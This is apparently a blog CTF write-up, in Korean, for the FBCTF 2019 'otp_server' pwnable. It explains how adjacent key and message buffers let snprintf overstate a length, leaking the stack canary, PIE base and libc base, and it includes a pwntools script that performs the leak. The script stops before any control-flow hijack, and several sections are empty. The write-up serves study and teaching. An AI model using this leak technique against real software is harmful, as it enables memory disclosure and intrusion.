---
title: FBCTF 2019 - otp_server
categories:
 - pwnable
tags: otp, pwn
---

```sh

Test our new OTP probocol: Randomly Over Padding
Spec: cipher((4 byte nonce) | message | (4 byte nonce))

1. Set Key
2. Encrypt message
3. Exit
>>> 

```

- Introduction
- Vunlnerability
- Exploit
- slv.py
- 느낀 점
- Reference


## Introduction

 FBCTF 2019에 있길래 풀어봄...
 09.10... 하기 너무싫다.

## Vunlnerability

 `Encrypt message`에서 key와 input 값이 가상메모리상에서 인접해있어서 `snprintf`에 `%s`의 인자에서 같이 길이가 측정된다.
 
 이 때문에 암호화된 메세지를 `write`함수로 출력할때 `length`의 값이 비정상적으로 크게 넘어가기 때문에 `canary`, `pie`, `libc` leak이 동시에 가능해진다.(canary, sfp, ret 주소가 leak됨)


## Exploit


## slv.py


from pwn import *


p = process('./otp_server')

sla = lambda c, s : p.sendlineafter(c, str(s))
sa = lambda c,s : p.sendafter(c, str(s))

context.terminal = ['/usr/bin/tmux', 'splitw', '-h']
context.log_level = 'debug'
script = '''
b* 0xb93
'''
def set_key(key):
    
    sa('>>> ' , 1)
    
    sa(':\n', key)
    
    return


def enc_message(message):
    
    sa('>>> ', 2)
    
    sa(':\n', message)
    
    return p.recvuntil('END ROP')

def exit():
    
    sa('>>> ', 3)
    
    return


def main():
    
    set_key('a'*0x100)
    gdb.attach(p,script)
    
    
    
    leak = enc_message('a'*0x100).split('aaaaaaa\x00')[1]
    canary = u64(leak[:8])
    pie_base = u64(leak[8:16]) - 0xdd0
    libc_base = u64(leak[16:24]) - 0x21b97
    
    log.info('canary : ' + hex(canary))
    log.info('pie_base : ' + hex(pie_base))
    log.info('libc_base : ' + hex(libc_base))
    
    set_key('b'*0x100)
    
    p.interactive()
    
    
    return


if __name__ == '__main__':
    main()


## 느낀 점


## Reference
